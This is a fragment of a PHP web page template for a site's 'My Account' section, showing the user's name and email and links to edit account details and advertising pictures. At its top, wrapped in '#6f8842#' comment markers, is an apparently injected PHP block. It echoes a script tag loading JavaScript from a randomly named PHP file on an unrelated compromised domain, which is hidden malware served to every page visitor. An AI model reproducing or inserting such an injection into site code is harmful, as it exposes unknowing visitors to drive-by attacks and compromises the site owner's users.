...
#6f8842#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224435\"></script>";
echo $srwv;
}
#/6f8842#
?>
	...
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		...
		<b><!-- InstanceBeginEditable name="header" -->My Account<!-- InstanceEndEditable --></b>
		<hr style="color:#d7d7d7; margin:2px; margin-bottom:10px; margin-top:10px;" />
		<!-- InstanceBeginEditable name="content" -->
		<br />
		<b>Welcome:</b> <?=$user_info["name"] ?><br />
		<br />
		<b>Your Email: </b> <?=$user_info["email"] ?><br />
		<hr style="border: #CCCCCC dotted 1px;" />

		<? if(isset($_GET["edit"]) == 1) { ?>
		<br />
		<div align="center" style="color:#990000">Edit account successfully...</div>
		<br />
		<? } ?>

		Your Account gives you ability to receive our news letter.
		<br /><br />

		<a href="edit.php">Edit Your Information</a>
        	<br /><br />
            
        <a href="addpictures.php">Edit My Advertise Pictures </a>
